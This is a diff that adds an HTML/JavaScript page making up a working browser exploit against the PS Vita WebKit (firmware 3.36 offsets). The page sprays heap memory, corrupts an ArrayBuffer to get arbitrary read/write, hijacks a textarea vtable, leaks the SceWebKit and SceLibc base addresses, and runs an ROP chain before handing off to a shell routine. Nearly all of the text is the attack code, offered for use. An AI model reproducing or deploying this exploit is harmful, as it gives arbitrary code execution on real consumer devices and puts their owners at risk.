@@ -1,0 +1,521 @@
+<html>
+<style>
+html, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, em:nth-child(5){
+    height: 500px
+}
+</style>
+
+<script src="include/exploit.js"></script>
+<script src="include/jquery.min.js"></script>
+<script src="include/lib.js"></script>
+<script src="include/rop.js"></script>
+<script src="include/shell.js"></script>
+<script src="include/utils.js"></script>
+
+
+<script type="text/javascript">
+arrays = Array();
+gc = Array();
+
+var _log0, _log, _dview;
+
+
+/* 
+    Get the immediate from a movw/t
+*/
+function imm_movx(ins)
+{
+    var imm12 = ins & 0xfff;
+    var imm4 = ins & 0xf0000;
+    return ((imm4 >> 4) | (imm12)) & 0xffff;
+}
+
+
+/*
+    Get len bytes from addr
+*/
+function get_bytes(aspace, addr, len)
+{
+    var retbuf = "";
+	var hex = 0x0;
+    for (var i = 0; i < len; i++) {
+        hex = aspace[addr + i].toString(16);
+        if(hex.length == 1){
+            hex = "0" + hex;
+        }
+        retbuf = retbuf + hex;
+    }
+    return retbuf;
+}
+
+
+/*
+    Swap endianness of 32-bit number
+*/
+function swap32(val)
+{
+    return (((val & 0xFF) << 24)
+           | ((val & 0xFF00) << 8)
+           | ((val >> 8) & 0xFF00)
+           | ((val >> 24) & 0xFF)) >>> 0;
+}
+
+/*
+    Get Library base address using given offsets
+*/
+function get_base_from_offsets(landmark, entry_off, base_off)
+{
+    var entryaddr = landmark + entry_off;
+    var entry = get_bytes(aspace, entryaddr, 4);
+    entry = parseInt(entry, 16);
+    entry = swap32(entry);
+    var movw = get_bytes(aspace, entry, 4);
+    movw = parseInt(movw, 16);
+    movw = swap32(movw);
+    movw = imm_movx(movw);
+    var movt = get_bytes(aspace, entry + 4, 4);
+    movt = parseInt(movt, 16);
+    movt = swap32(movt);
+    movt = imm_movx(movt);
+
+    var ptr = ((movt << 16) | movw) >>> 0;
+    var base = ptr - base_off;
+
+    return base;
+} 
+
+/*
+    Get some storage space
+*/
+function initmemory(start_addr)
+{
+    return function(size) {
+        var res = start_addr;
+		while(size % 0x4) ++size; // Add padding to prevent memory misalignment...
+        start_addr += size;
+        return res;
+    }
+}
+
+/*
+    Version offsets
+*/
+function defineOff()
+{
+	ver_offsets = {
+		v3_36:{
+				elementvtable_off: -0x70,
+				setscrollleft_idx: 0x4e, // * 4
+				scewkbase_off: 0x406999,
+				scelibcentry_off: 0x8571b8,
+				scelibcbase_off: 0xf9f5,
+		}
+	}
+}
+
+/*
+    Gadget initializer
+*/
+function init_ggts(bases, caller, ver)
+{
+    var results = version_deps[ver];
+    for (b in bases)
+	{
+        if (bases.hasOwnProperty(b)) 
+		{
+            func_list = results[b].functions;
+            for (fcn in func_list) 
+			{
+                if (func_list.hasOwnProperty(fcn)) 
+				{
+                    func_list[fcn] = caller(func_list[fcn] + bases[b], results);
+                }
+            }
+            gadgets = results[b].gadgets;
+            for (ggt in gadgets)
+			{
+                if (gadgets.hasOwnProperty(ggt))
+				{
+                    gadgets[ggt]= gadgets[ggt] + bases[b];
+                }
+            } 
+        }
+    }
+    return results;
+}
+
+/*
+   Function caller
+*/
+function get_caller(tmpmem, element, vtidx, fkvtable, version)
+{
+    return function (fcn, libraries)
+	{
+        return function(r0, r1, r2, r3)
+		{
+            var allocate_tmp = initmemory(tmpmem);
+            var context_size = 0x30;
+            var eleobj_size = 0x22;
+
+            var scontext = allocate_tmp(context_size * 4);
+            var seleobj = allocate_tmp(eleobj_size * 4);
+            var scewkggts = libraries.SceWebKit.gadgets;
+            var scelibcggts = libraries.SceLibc.gadgets;
+
+			// Save Element object
+            for (var i = 0; i < eleobj_size; i++) {
+                aspace32[(seleobj + (i << 2)) / 4] = aspace32[(vtidx + (i << 2)) / 4];
+            }
+
+			// Call setjmp
+            aspace32[(fkvtable + (0x4e << 2)) / 4] = scelibcggts.scesetjmp;
+            element.scrollLeft = 0xdeadbabe;
+
+            // Save jmp context
+            for (var i = 0; i < context_size; i++) {
+                aspace32[(scontext + (i << 2)) / 4] = aspace32[(vtidx + (i << 2)) / 4];
+            }
+
+            // Restore Element object
+            for (var i = 0; i < 30; i++) {
+                aspace32[(vtidx + (i << 2)) / 4] = aspace32[(seleobj + (i << 2)) / 4];
+            }
+			
+			var retval = allocate_tmp(0x4);
+
+			if (version == "v3_36")
+			{
+				// ROP chain for FW 3.36
+				var r1values = allocate_tmp(0x10 * 4);
+				var r4values = allocate_tmp(0x10 * 4);
+				var r1values2 = allocate_tmp(0x10 * 4);
+				var r4values2 = allocate_tmp(0x10 * 4);
+				
+				mymemset(retval, 0, 4);
+
+				aspace32[((r1values + 0) / 4)] = r0;                           // r0
+				aspace32[((r1values + 4) / 4)] = r1;                           // r1
+				aspace32[((r1values + 8) / 4)] = r2;                           // r2
+				aspace32[((r1values + 12) / 4)] = r4values;                    // r4
+				aspace32[((r1values + 16) / 4)] = 0x0;                         // ip
+				aspace32[((r1values + 20) / 4)] = scewkggts.ldmr4_1;           // lr
+				aspace32[((r1values + 24) / 4)] = fcn;                         // pc
+
+				aspace32[((r4values + 0) / 4)] = r1values2;                    // r1
+				aspace32[((r4values + 4) / 4)] = 0;                            // ip
+				aspace32[((r4values + 8) / 4)] = 0;                            // lr
+				aspace32[((r4values + 12) / 4)] = scewkggts.ldmr1_3;           // pc
+
+				aspace32[((r1values2 + 0) / 4)] = retval;                      // r1
+				aspace32[((r1values2 + 4) / 4)] = r4values2;                   // r4
+				aspace32[((r1values2 + 8) / 4)] = 0;                           // ip
+				aspace32[((r1values2 + 12) / 4)] = scewkggts.ldmr4_2;          // lr
+				aspace32[((r1values2 + 16) / 4)] = scewkggts.strr0;            // pc
+
+				aspace32[((r4values2 + 0) / 4)] = scontext;                    // r0
+				aspace32[((r4values2 + 4) / 4)] = 0;                           // ip
+				aspace32[((r4values2 + 8) / 4)] = 0;                           // lr
+				aspace32[((r4values2 + 12) / 4)] = scelibcggts.scelongjmp;     // pc
+				
+				var ropchain = [0, r1values, r3, 0, 0, 0, 0, scewkggts.ldmr1_2];
+				var rchainaddr = allocate_tmp(ropchain.length * 4);
+				
+				// Copy ROPchain
+				for (var i = 0; i < ropchain.length; i++) {
+					aspace32[(rchainaddr + (i << 2)) / 4] = ropchain[i];
+				}
+
+				// Trigger ROPchain
+				aspace32[(fkvtable + (0x4e << 2)) / 4] = scewkggts.ldmr1_1; 
+				element.scrollLeft = rchainaddr;
+			}
+			
+            return aspace32[(retval / 4)];
+        }
+    };
+}
+
+/*
+   Resolved library functions
+*/
+function defineLibFuncs()
+{
+	// FW 3.36 library functions' offsets.
+	sceLibcFcns_v336 =
+	{
+		time: 0x000006e9,
+	}
+	
+	version_deps =
+	{
+		v3_36:
+		{
+			"SceWebKit":        
+			{
+				gadgets:
+				{
+					ldmr1_1: 0x8c004,      // ldm	r1, {r0, r1, r3, r4, r9, fp, ip, pc}
+					ldmr1_2: 0x649cc4,     // ldm	r1, {r0, r1, r2, r4, ip, lr, pc}
+					ldmr4_1: 0x2e340c,     // ldm	r4, {r1, ip, lr, pc}
+					ldmr1_3: 0x295dc,      // ldm	r1, {r1, r4, ip, lr, pc}
+					strr0: 0x127e20 | 1,   // str	r0, [r1, #0]; bx lr
+					ldmr4_2: 0x42dd4       // ldm	r4, {r0, ip, lr, pc}
+				},
+				functions: {}
+			},
+			"SceLibc":
+			{
+				functions: sceLibcFcns_v336,
+				gadgets : 
+				{
+					scesetjmp : 0x13df0 | 1,
+					scelongjmp : 0x13e18 | 1
+				}
+			}
+		}
+	}
+}
+
+
+function load()
+{
+	for (var i = 0; i < 0x1000; ++i) {
+        gc.push(new ArrayBuffer(0x30));
+        gc.push(new ArrayBuffer(0x40));
+        gc.push(new ArrayBuffer(0x4));
+    }
+
+    var cssRules = window.getMatchedCSSRules(document.documentElement);
+
+    cssRules[0].selectorText = 'a1,a2,a3,a4,a5,a6';
+
+    for (var i = 0; i < 0x100; ++i)
+        arrays.push(new ArrayBuffer(0x20040));
+    setTimeout(al, 100);
+}
+
+function crashme()
+{
+    document.getElementsByTagName("iframe")[0].contentWindow.scrollX;
+    document.open();
+}
+
+function crash()
+{
+    document.write('<iframe></iframe><object onbeforeload="crashme()">');
+    document.body.offsetLeft;
+    setTimeout(function() {
+        document.close();
+    }, 1);
+    throw "BadLuck";
+}
+
+function dbg()
+{
+    alert(corrupted.byteLength.toString(16));
+    var u32 = new Uint32Array(corrupted);
+    var s = "";
+    for (var i = 0; i < 0xc0 / 4; ++i)
+        s += u32[0x20000 / 4 + i].toString(16) + ",";
+    alert(s);
+}
+
+function al()
+{
+    corrupted = undefined;
+    for (var i = 0; i < arrays.length; ++i) {
+        if (arrays[i].byteLength == 0x200c0) {
+            corrupted = arrays[i];
+            break;
+        }
+    }
+    if (!corrupted)
+        crash();
+    arrays = Array();
+    gc = Array();
+
+    setTimeout(spray, 10);
+}
+
+function MemoryHole()
+{
+	document.write("</br></br> call MemHole </br>");
+
+	textareas = new Array();
+	
+		// Check Vita version for ROP offsets.
+		var user_agent = navigator.userAgent;
+		if (user_agent.indexOf("Vita 3.30") != -1) {
+			version = "v3_30";
+			document.write("</br> PS Vita Version = 3.30");
+		} else if (user_agent.indexOf("Vita 3.35") != -1) {
+			version = "v3_35";
+			document.write("</br> PS Vita Version = 3.35");
+		} else if (user_agent.indexOf("Vita 3.36") != -1) {
+			version = "v3_36";
+			document.write("</br> PS Vita Version = 3.36");
+		} else {
+			//document.write("</br>");document.write("Not Supported !");
+			document.write("</br> PS Vita Version is not supported");
+			return -1;
+		}
+		document.write("</br>");
+
+		document.write("</br> Create textarea : ")
+		for (var i = 0; i < 0x2000; ++i) {
+			var e = document.createElement("textarea");
+			e.rows = 0x66656463;
+			textareas.push(e);
+		}
+		document.write("   DONE");
+
+		//document.write("</br>");document.write
+
+		document.write("</br> Change textarea.rows : ");
+		var textarea_addr = 0;
+		for (var x = 0; x < 0x10000; ++x) {
+			var addr = 0x85200000 / 4 + x;
+			if (aspace32[addr] == 0x66656463) {
+				//document.write("</br>");document.write("Changing textarea.rows at addr " + (addr * 4).toString(16));
+				aspace32[addr] = 0x55555555;
+				textarea_addr = addr * 4;
+				break;
+			}
+		}
+		document.write("   DONE // at Address " + (addr * 4).toString(16) );
+		document.write("</br>");
+
+		document.write(" Find corrupted textarea : ");
+		var corrupted_textarea;
+		for (var i = 0; i < textareas.length; ++i) {
+			if (textareas[i].rows == 0x55555555) {
+				corrupted_textarea = textareas[i];
+				//document.write("</br>");document.write("Found corrupted textarea at " + i);
+				break;
+			}
+		}
+		document.write("   DONE // at " +i);
+
+
+		document.write("</br>defining LibFuncs : ");
+		defineLibFuncs();
+		document.write("   DONE");
+
+		document.write("</br> defining Offsets : ");
+		defineOff();
+		document.write("   DONE");
+
+		offsets = ver_offsets[version];
+
+		var vtidx = textarea_addr + offsets.elementvtable_off;
+		var textareavptr = aspace32[vtidx / 4];
+		//document.write("</br> Textarea vptr: 0x" + textareavptr.toString(16));
+
+		var setscrollleftptr = aspace32[textareavptr / 4 + offsets.setscrollleft_idx];
+		//document.write("</br> WebCore::HTMLBodyElement::setScrollLeft is at 0x" + setscrollleftptr.toString(16));
+
+		var scewkbase = setscrollleftptr - offsets.scewkbase_off;
+
+		document.write("</br> Allocate memory : ");
+		allocate_memory = initmemory(u32_base); // we should have 0x20040 bytes of memory we can freely use
+		document.write("   DONE");
+
+		document.write("</br> Fake vtable : ");
+		var fkvtable = allocate_memory(0x100 * 4);
+		document.write(" DONE // at: 0x" + fkvtable.toString(16));
+
+		for (var i = 0; i < 0x100; i++) {
+			aspace32[(fkvtable + (i << 2))/ 4] = aspace32[(textareavptr + (i << 2)) / 4];
+		}
+
+		aspace32[(vtidx) / 4] = fkvtable;
+
+		document.write("</br> Creating scelibcbase : ");
+		var scelibcbase = get_base_from_offsets(scewkbase, offsets.scelibcentry_off, offsets.scelibcbase_off);
+		document.write("   DONE");
+
+
+		document.write("</br>");document.write("-------------------------------------------------");
+		document.write("</br>");document.write("SceWebkit base: 0x" + scewkbase.toString(16));
+		document.write("</br>");document.write("SceLibc base: 0x" + scelibcbase.toString(16));
+		document.write("</br>");document.write("-------------------------------------------------");
+
+		var bases = {
+			"SceWebKit": scewkbase,
+			"SceLibc": scelibcbase
+		};
+
+		var tmpmem = allocate_memory(0x5000);
+		caller = get_caller(tmpmem, corrupted_textarea, vtidx, fkvtable, version);
+		libraries = init_ggts(bases, caller, version);
+
+		var t = libraries.SceLibc.functions.time(0);
+		document.write("</br>");document.write("Time: " + t);
+		
+		document.write("</br>");document.write("Exploit completed!\n");
+
+		return aspace;
+	
+
+    return -1;
+}
+
+newarrays = Array();
+latest = Array();
+
+var tries = 0;
+
+function spray()
+{
+    ++tries;
+    document.write("Attempt #" + tries + "<br>");
+    if (tries > 10)
+        crash();
+
+    latest = Array();
+    for (var i = 0; i < 0x20000; ++i) {
+        var t = new ArrayBuffer(0x7);
+        newarrays.push(t);
+        latest.push(t);
+    }
+
+    var u32 = new Uint32Array(corrupted);
+
+    var found = false;
+    for (var i = 0; i < 0xc0 / 4; ++i) {
+        var j = 0x20000 / 4 + i;
+        if (u32[j] == 0x7) {
+            found = true;
+            u32_base = u32[j - 1];
+            u32[j - 1] = 0;
+            u32[j] = 0xFFFFFFE0;
+        }
+    }
+    if (found) {
+        for (var i = 0; i < latest.length; ++i) {
+            if (latest[i].byteLength == 0xFFFFFFE0) {
+                big = latest[i];
+                break;
+            }
+		}
+        newarrays = undefined;
+        latest = undefined;
+        document.write("Success!");
+
+        aspace = new Uint8Array(big);
+        aspace16 = new Uint16Array(big);
+        aspace32 = new Uint32Array(big);
+        setTimeout(function() {
+        
+			MemoryHole();
+			
+			shell(aspace);
+        }, 100);
+    } else {
+        setTimeout(spray, 10);
+    }
+}
+</script>
+
+<iframe onload=load()>
+</html>
